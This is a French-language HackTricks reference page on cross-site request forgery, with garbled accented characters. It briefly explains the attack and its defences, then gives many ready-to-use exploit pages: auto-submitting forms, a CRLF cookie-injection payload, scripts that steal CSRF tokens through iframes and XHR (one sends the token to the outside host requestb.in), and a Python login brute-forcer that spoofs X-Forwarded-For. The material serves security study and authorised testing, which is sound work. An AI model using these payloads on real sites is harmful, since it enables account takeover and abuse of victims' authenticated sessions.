# CSRF (Cross Site Request Forgery)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des pirates exp√©riment√©s et des chasseurs de primes !

**Perspectives de piratage**\
Engagez-vous avec du contenu qui explore le frisson et les d√©fis du piratage

**Actualit√©s de piratage en temps r√©el**\
Restez inform√© du monde du piratage en √©volution rapide gr√¢ce √† des actualit√©s et des informations en temps r√©el

**Derni√®res annonces**\
Restez inform√© des derni√®res primes de bugs lanc√©es et des mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs pirates d√®s aujourd'hui !

## Explication de la faille de s√©curit√© CSRF (Cross-Site Request Forgery)

**La faille de s√©curit√© Cross-Site Request Forgery (CSRF)** est un type de vuln√©rabilit√© de s√©curit√© que l'on trouve dans les applications web. Elle permet aux attaquants d'effectuer des actions au nom d'utilisateurs sans m√©fiance en exploitant leurs sessions authentifi√©es. L'attaque est ex√©cut√©e lorsqu'un utilisateur, connect√© √† la plateforme d'une victime, visite un site malveillant. Ce site d√©clenche ensuite des requ√™tes vers le compte de la victime √† travers des m√©thodes telles que l'ex√©cution de JavaScript, la soumission de formulaires ou le chargement d'images.

### Pr√©requis pour une attaque CSRF

Pour exploiter une vuln√©rabilit√© CSRF, plusieurs conditions doivent √™tre remplies :

1. **Identifier une action de valeur** : L'attaquant doit trouver une action √† exploiter, telle que changer le mot de passe de l'utilisateur, son adresse e-mail ou √©lever ses privil√®ges.
2. **Gestion de session** : La session de l'utilisateur doit √™tre g√©r√©e uniquement via des cookies ou l'en-t√™te d'authentification de base HTTP, car les autres en-t√™tes ne peuvent pas √™tre manipul√©s √† cette fin.
3. **Absence de param√®tres impr√©visibles** : La requ√™te ne doit pas contenir de param√®tres impr√©visibles, car ils peuvent emp√™cher l'attaque.

### V√©rification rapide

Vous pourriez **capturer la requ√™te dans Burp** et v√©rifier les protections CSRF et pour tester depuis le navigateur, vous pouvez cliquer sur **Copier comme fetch** et v√©rifier la requ√™te :

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

### Se d√©fendre contre les attaques CSRF

Plusieurs contre-mesures peuvent √™tre mises en place pour se prot√©ger contre les attaques CSRF :

* [**Cookies SameSite**](hacking-with-cookies/#samesite) : Cet attribut emp√™che le navigateur d'envoyer des cookies avec des requ√™tes entre sites. [En savoir plus sur les cookies SameSite](hacking-with-cookies/#samesite).
* [**Partage de ressources entre origines**](cors-bypass.md) : La politique CORS du site victime peut influencer la faisabilit√© de l'attaque, surtout si l'attaque n√©cessite la lecture de la r√©ponse du site victime. [Apprenez-en plus sur le contournement de CORS](cors-bypass.md).
* **V√©rification de l'utilisateur** : Demander le mot de passe de l'utilisateur ou r√©soudre un captcha peut confirmer l'intention de l'utilisateur.
* **V√©rification des en-t√™tes Referrer ou Origin** : Valider ces en-t√™tes peut aider √† garantir que les requ√™tes proviennent de sources de confiance. Cependant, une manipulation prudente des URL peut contourner des v√©rifications mal impl√©ment√©es, telles que :
  * Utiliser `http://mal.net?orig=http://example.com` (l'URL se termine par l'URL de confiance)
  * Utiliser `http://example.com.mal.net` (l'URL commence par l'URL de confiance)
* **Modification des noms de param√®tres** : Modifier les noms de param√®tres dans les requ√™tes POST ou GET peut aider √† pr√©venir les attaques automatis√©es.
* **Jetons CSRF** : Incorporer un jeton CSRF unique dans chaque session et exiger ce jeton dans les requ√™tes ult√©rieures peut att√©nuer consid√©rablement le risque de CSRF. L'efficacit√© du jeton peut √™tre renforc√©e en imposant CORS.

Comprendre et mettre en ≈ìuvre ces d√©fenses est crucial pour maintenir la s√©curit√© et l'int√©grit√© des applications web.

## Contournement des d√©fenses

### De POST √† GET

Peut-√™tre que le formulaire que vous souhaitez exploiter est configur√© pour envoyer une **requ√™te POST avec un jeton CSRF mais**, vous devriez **v√©rifier** si un **GET** est √©galement **valide** et si lorsque vous envoyez une requ√™te GET le **jeton CSRF est toujours valid√©**.

### Absence de jeton

Les applications peuvent mettre en place un m√©canisme pour **valider les jetons** lorsqu'ils sont pr√©sents. Cependant, une vuln√©rabilit√© appara√Æt si la validation est compl√®tement ignor√©e lorsque le jeton est absent. Les attaquants peuvent exploiter cela en **supprimant le param√®tre** portant le jeton, pas seulement sa valeur. Cela leur permet de contourner le processus de validation et de mener une attaque de type Cross-Site Request Forgery (CSRF) efficacement.

### Le jeton CSRF n'est pas li√© √† la session utilisateur

Les applications **ne liant pas les jetons CSRF aux sessions utilisateur** pr√©sentent un risque de s√©curit√© important. Ces syst√®mes v√©rifient les jetons par rapport √† un **pool global** plut√¥t que de garantir que chaque jeton est li√© √† la session initiale.

Voici comment les attaquants exploitent cela :

1. **S'authentifier** avec leur propre compte.
2. **Obtenir un jeton CSRF valide** √† partir du pool global.
3. **Utiliser ce jeton** dans une attaque CSRF contre une victime.

Cette vuln√©rabilit√© permet aux attaquants de faire des requ√™tes non autoris√©es au nom de la victime, exploitant le m√©canisme de validation de jeton insuffisant de l'application.

### Contournement de m√©thode

Si la requ√™te utilise une **"m√©thode inhabituelle"**, v√©rifiez si la **fonctionnalit√© de remplacement de m√©thode** fonctionne. Par exemple, si elle **utilise une m√©thode PUT**, vous pouvez essayer d'**utiliser une m√©thode POST** et **envoyer** : _https://example.com/my/dear/api/val/num?**\_method=PUT**_

Cela pourrait √©galement fonctionner en envoyant le **param√®tre \_method √† l'int√©rieur d'une requ√™te POST** ou en utilisant les **en-t√™tes** :

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_

### Contournement du jeton d'en-t√™te personnalis√©

Si la requ√™te ajoute un **en-t√™te personnalis√©** avec un **jeton** √† la requ√™te comme **m√©thode de protection CSRF**, alors :

* Testez la requ√™te sans le **jeton personnalis√© et aussi l'en-t√™te**.
* Testez la requ√™te avec une **longueur exactement identique mais un jeton diff√©rent**.

### Le jeton CSRF est v√©rifi√© par un cookie

Les applications peuvent mettre en place une protection CSRF en dupliquant le jeton √† la fois dans un cookie et un param√®tre de requ√™te ou en d√©finissant un cookie CSRF et en v√©rifiant si le jeton envoy√© en arri√®re-plan correspond au cookie. L'application valide les requ√™tes en v√©rifiant si le jeton dans le param√®tre de requ√™te correspond √† la valeur dans le cookie.

Cependant, cette m√©thode est vuln√©rable aux attaques CSRF si le site web pr√©sente des failles permettant √† un attaquant de d√©finir un cookie CSRF dans le navigateur de la victime, comme une vuln√©rabilit√© CRLF. L'attaquant peut exploiter cela en chargeant une image trompeuse qui d√©finit le cookie, suivi de l'initiation de l'attaque CSRF.

Voici un exemple de la structure d'une attaque :
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>

```
{% hint style="info" %}
Notez que si le **jeton csrf est li√© au cookie de session, cette attaque ne fonctionnera pas** car vous devrez d√©finir votre session comme victime, et donc vous vous attaquerez vous-m√™me.
{% endhint %}

### Changement de Content-Type

Selon [**ceci**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests), afin d'**√©viter les requ√™tes de pr√©-v√©rification** en utilisant la m√©thode **POST**, voici les valeurs de Content-Type autoris√©es :

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

Cependant, notez que la **logique des serveurs peut varier** en fonction du **Content-Type** utilis√©, donc vous devriez essayer les valeurs mentionn√©es et d'autres comme **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._

Exemple (de [ici](https://brycec.me/posts/corctf\_2021\_challenges)) d'envoi de donn√©es JSON en tant que text/plain :
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### Contournement des demandes de pr√©-v√©rification pour les donn√©es JSON

Lors de la tentative d'envoi de donn√©es JSON via une requ√™te POST, l'utilisation de `Content-Type: application/json` dans un formulaire HTML n'est pas directement possible. De m√™me, l'utilisation de `XMLHttpRequest` pour envoyer ce type de contenu initie une demande de pr√©-v√©rification. N√©anmoins, il existe des strat√©gies pour contourner potentiellement cette limitation et v√©rifier si le serveur traite les donn√©es JSON ind√©pendamment du Content-Type :

1. **Utiliser des types de contenu alternatifs** : Utilisez `Content-Type: text/plain` ou `Content-Type: application/x-www-form-urlencoded` en d√©finissant `enctype="text/plain"` dans le formulaire. Cette approche teste si le backend utilise les donn√©es ind√©pendamment du Content-Type.
2. **Modifier le type de contenu** : Pour √©viter une demande de pr√©-v√©rification tout en garantissant que le serveur reconnaisse le contenu comme JSON, vous pouvez envoyer les donn√©es avec `Content-Type: text/plain; application/json`. Cela ne d√©clenche pas de demande de pr√©-v√©rification mais pourrait √™tre trait√© correctement par le serveur s'il est configur√© pour accepter `application/json`.
3. **Utilisation de fichiers Flash SWF** : Une m√©thode moins courante mais r√©alisable implique l'utilisation d'un fichier Flash SWF pour contourner de telles restrictions. Pour une compr√©hension approfondie de cette technique, consultez [cet article](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).

### Contournement de la v√©rification du R√©f√©rent / Origine

**√âviter l'en-t√™te R√©f√©rent**

Les applications peuvent valider l'en-t√™te 'Referer' uniquement lorsqu'il est pr√©sent. Pour emp√™cher un navigateur d'envoyer cet en-t√™te, la balise meta HTML suivante peut √™tre utilis√©e :
```xml
<meta name="referrer" content="never">
```
Cela garantit que l'en-t√™te 'Referer' est omis, contournant potentiellement les v√©rifications de validation dans certaines applications.

**Contournements Regexp**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Pour d√©finir le nom de domaine du serveur dans l'URL que le R√©f√©rent va envoyer √† l'int√©rieur des param√®tres, vous pouvez faire :
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **Contournement de la m√©thode HEAD**

La premi√®re partie de [**ce compte rendu CTF**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution) explique que dans [le code source d'Oak](https://github.com/oakserver/oak/blob/main/router.ts#L281), un routeur est configur√© pour **traiter les requ√™tes HEAD comme des requ√™tes GET** sans corps de r√©ponse - une solution de contournement courante qui n'est pas propre √† Oak. Au lieu d'un gestionnaire sp√©cifique pour les requ√™tes HEAD, elles sont simplement **transmises au gestionnaire GET mais l'application supprime simplement le corps de r√©ponse**.

Par cons√©quent, si une requ√™te GET est limit√©e, vous pourriez simplement **envoyer une requ√™te HEAD qui sera trait√©e comme une requ√™te GET**.

## **Exemples d'exploitation**

### **Exfiltration du jeton CSRF**

Si un **jeton CSRF** est utilis√© comme **d√©fense**, vous pourriez essayer de **l'exfiltrer** en exploitant une vuln√©rabilit√© [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) ou une vuln√©rabilit√© [**Dangling Markup**](dangling-markup-html-scriptless-injection/).

### **GET en utilisant des balises HTML**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
D'autres balises HTML5 qui peuvent √™tre utilis√©es pour envoyer automatiquement une requ√™te GET sont :
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="">
<embed src="...">
<audio src="...">
<video src="...">
<source src="..." type="...">
<video poster="...">
<link rel="stylesheet" href="...">
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body { background: url('...'); }
</style>
<bgsound src="...">
<track src="..." kind="subtitles">
<input type="image" src="..." alt="Submit Button">
```
### Requ√™te GET de formulaire
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### Requ√™te POST de formulaire
```html
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### Envoyer une requ√™te POST de formulaire via un iframe
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Requ√™te POST Ajax**
```html
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### Requ√™te POST multipart/form-data
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### Requ√™te POST multipart/form-data v2
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### Requ√™te POST de formulaire √† partir d'un iframe
```html
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **Vol CSRF Token et envoie une requ√™te POST**
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **Vol de jeton CSRF et envoi d'une requ√™te POST √† l'aide d'un iframe, d'un formulaire et d'Ajax**
```html
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **Vol CSRF Token et envoyer une requ√™te POST en utilisant un iframe et un formulaire**
```html
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **Vol de jeton et envoi √† l'aide de 2 iframes**
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **POSTVoler le jeton CSRF avec Ajax et envoyer une requ√™te POST avec un formulaire**
```html
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### CSRF avec Socket.IO
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF Brute Force de Connexion

Le code peut √™tre utilis√© pour effectuer une attaque de force brute sur un formulaire de connexion en utilisant un jeton CSRF (Il utilise √©galement l'en-t√™te X-Forwarded-For pour tenter de contourner un √©ventuel blocage d'IP) :
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## Outils <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## R√©f√©rences

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
* [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

‚Äã

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de bugs !

**Perspectives de Hacking**\
Engagez-vous avec du contenu qui explore le frisson et les d√©fis du hacking

**Actualit√©s de Hacking en Temps R√©el**\
Restez √† jour avec le monde du hacking en √©volution rapide gr√¢ce aux actualit√©s et aux informations en temps r√©el

**Derni√®res Annonces**\
Restez inform√© des derni√®res primes de bugs lanc√©es et des mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
